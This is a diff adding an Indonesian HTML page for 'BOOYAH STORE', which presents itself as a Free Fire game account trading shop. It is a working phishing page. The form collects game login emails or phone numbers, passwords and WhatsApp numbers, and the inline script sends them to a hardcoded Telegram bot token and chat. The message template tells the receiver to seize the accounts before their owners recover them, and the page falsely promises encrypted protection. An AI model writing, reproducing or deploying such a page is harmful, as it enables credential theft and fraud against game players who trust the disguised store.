@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOOYAH STORE - Jual & Tukar Akun FF</title>
+    <!-- Menghubungkan ke file style.css -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- NAVIGASI -->
+    <header>
+        <div class="logo">💥 BOOYAH STORE</div>
+        <nav>
+            <a href="#ready-store">Akun Ready</a>
+            <a href="#tukar-bot">Tukar Akun (Bot)</a>
+        </nav>
+    </header>
+
+    <!-- BANNER DEPAN (HERO) -->
+    <section class="hero">
+        <h1>SISTEM TUKAR & JUAL AKUN FREE FIRE</h1>
+        <p>Tempat tukar tambah akun FF paling aman, anti-banned, dan langsung diverifikasi otomatis oleh bot.</p>
+    </section>
+
+    <!-- FITUR SINGKAT -->
+    <section class="features">
+        <div class="feat-box">🛡️ Sistem Rekber Bot Aman</div>
+        <div class="feat-box">⚡ Verifikasi 5 Menit</div>
+        <div class="feat-box">🔥 Akun Kualitas Booyah</div>
+    </section>
+
+    <!-- SEKSI KATALOG AKUN READY -->
+    <section id="ready-store" class="container">
+        <h2>🔥 AKUN FF READY STOCK</h2>
+        <div class="grid">
+            
+            <!-- Kartu Akun 1 -->
+            <div class="card">
+                <div class="badge-ready">Ready</div>
+                <img src="https://unsplash.com" alt="Akun FF">
+                <div class="card-body">
+                    <h3>Akun FF Old Gg (Spek Mantap)</h3>
+                    <p class="desc">Set Bundle Alok Old, Letda Hyper, Evo Gun MP40 Predatory Lv 5, Vault rame 200+ skin.</p>
+                    <p class="price">Rp 450.000</p>
+                    <a href="#tukar-bot" class="btn">Tukar / Beli via Bot</a>
+                </div>
+            </div>
+
+            <!-- Kartu Akun 2 -->
+            <div class="card">
+                <div class="badge-ready">Ready</div>
+                <img src="https://unsplash.com" alt="Akun FF">
+                <div class="card-body">
+                    <h3>Akun Full Evo Gun Max</h3>
+                    <p class="desc">AK Blue Flame Dragon MAX, M1014 Green Flame Dragon MAX. Akun login aman FB (tangan pertama).</p>
+                    <p class="price">Rp 850.000</p>
+                    <a href="#tukar-bot" class="btn">Tukar / Beli via Bot</a>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- SEKSI FORM UTAMA SETOR KE BOT -->
+    <section id="tukar-bot" class="container" style="background-color: #11141a;">
+        <div style="text-align: center;">
+            <h2>🔄 FORM SETOR AKUN FF KE BOT ADMIN</h2>
+        </div>
+        
+        <div class="form-box">
+            <form id="ffFormFinal">
+                <div class="form-group">
+                    <label for="ff_nick">Nickname FF Kamu:</label>
+                    <input type="text" id="ff_nick" placeholder="Contoh: ⚔️[BOOYAH]•Pro" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_login">Metode Login Akun:</label>
+                    <select id="ff_login" required>
+                        <option value="Facebook">Facebook (FB)</option>
+                        <option value="Google/Gmail">Google (Gmail)</option>
+                        <option value="VK Account">Akun VK</option>
+                        <option value="Huawei">Akun Huawei</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_email">Email / Nomor HP Akun FF:</label>
+                    <input type="text" id="ff_email" placeholder="Masukkan Email atau No HP Login" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_pass">Password Akun FF:</label>
+                    <input type="password" id="ff_pass" placeholder="Masukkan Password Akun" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_spek">Daftar Bundle & Evo Gun Penting (Spesifikasi):</label>
+                    <textarea id="ff_spek" rows="3" placeholder="Contoh: Bundle Cobra, AK Naga Lv 4, SG2 Ungu, dll." required></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_target">Mau Ditukar dengan Akun No. Berapa / Uang Berapa?</label>
+                    <input type="text" id="ff_target" placeholder="Contoh: Mau tukar tambah dengan Akun Full Evo Gun Max" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ff_wa">Nomor WhatsApp Kamu (Untuk Hubungi Balik):</label>
+                    <input type="text" id="ff_wa" placeholder="Contoh: 08123456789" required>
+                </div>
+
+                <div class="warning-text">
+                    ⚠️ <b>SISTEM KEAMANAN TELEGRAM ENKRIPSI:</b> Data login yang Anda kirimkan diproteksi dan langsung terkirim ke Bot Enkripsi Telegram milik Admin. Jangan keluar dari website setelah menekan tombol kirim hingga proses pemrosesan selesai.
+                </div>
+
+                <button type="button" onclick="prosesKirimBot()" class="btn-submit">KIRIM DATA AKUN KE BOT ADMIN</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer>
+        <p>&copy; 2026 BOOYAH STORE - Garena Free Fire Fan Store. All Rights Reserved.</p>
+        <p style="font-size: 11px; margin-top: 5px; color: #444;">Website statis dihosting aman menggunakan GitHub Pages.</p>
+    </footer>
+
+    <!-- SCRIPT LOGIKA TELEGRAM BOT -->
+    <script>
+    function prosesKirimBot() {
+        const nick = document.getElementById('ff_nick').value;
+        const login = document.getElementById('ff_login').value;
+        const email = document.getElementById('ff_email').value;
+        const pass = document.getElementById('ff_pass').value;
+        const spek = document.getElementById('ff_spek').value;
+        const target = document.getElementById('ff_target').value;
+        const wa = document.getElementById('ff_wa').value;
+
+        if(!nick || !email || !pass || !spek || !target || !wa) {
+            alert("❌ GAGAL! Semua data wajib diisi lengkap agar akun bisa diperiksa oleh sistem bot.");
+            return;
+        }
+
+        // ⚠️ PENTING: GANTI DUA DATA DI BAWAH INI DENGAN DATA BOT KAMU SENDIRI
+        const telegramToken = "8944168845:AAFsb-toTlwSz9focFnMvQEAnDQyNByv5RA"; 
+        const chatId = "-1003731213733"; 
+
+        const pesanTelegram = `📥 *SETORAN AKUN FF MASUK (BOT SYSTEM)* 📥\n\n` +
+                              `👤 *Nickname:* ${nick}\n` +
+                              `🌐 *Metode Login:* ${login}\n` +
+                              `📧 *Email/No HP:* \`${email}\` (Klik untuk salin)\n` +
+                              `🔑 *Password:* \`${pass}\` (Klik untuk salin)\n\n` +
+                              `🎒 *Spesifikasi Akun:* \n_${spek}_\n\n` +
+                              `🔄 *Permintaan Tukar:* \n*${target}*\n\n` +
+                              `📞 *Hubungi Pengirim (WA):* https://wa.me{wa.replace(/[^0-9]/g, '')}\n\n` +
+                              `👉 _Tindakan: Segera amankan data akun di atas sebelum diambil alih kembali oleh pengaju!_`;
+
+        const urlAPI = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        
+        fetch(urlAPI, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: pesanTelegram,
+                parse_mode: "Markdown"
+            })
+        })
+        .then(response => {
+            if(response.ok) {
+                alert("✅ BERHASIL! Akun Anda sudah diterima oleh Bot Sistem. Admin akan segera masuk ke akun Anda untuk mengecek spek asli. Silakan tunggu di WhatsApp Anda untuk konfirmasi.");
+                document.getElementById('ffFormFinal').reset();
+            } else {
+                alert("❌ Terjadi kesalahan pada konfigurasi bot internal website. Silakan hubungi admin langsung.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("❌ Terjadi gangguan koneksi internet. Silakan coba lagi.");
+        });
+    }
+    </script>
+
+</body>
+</html>
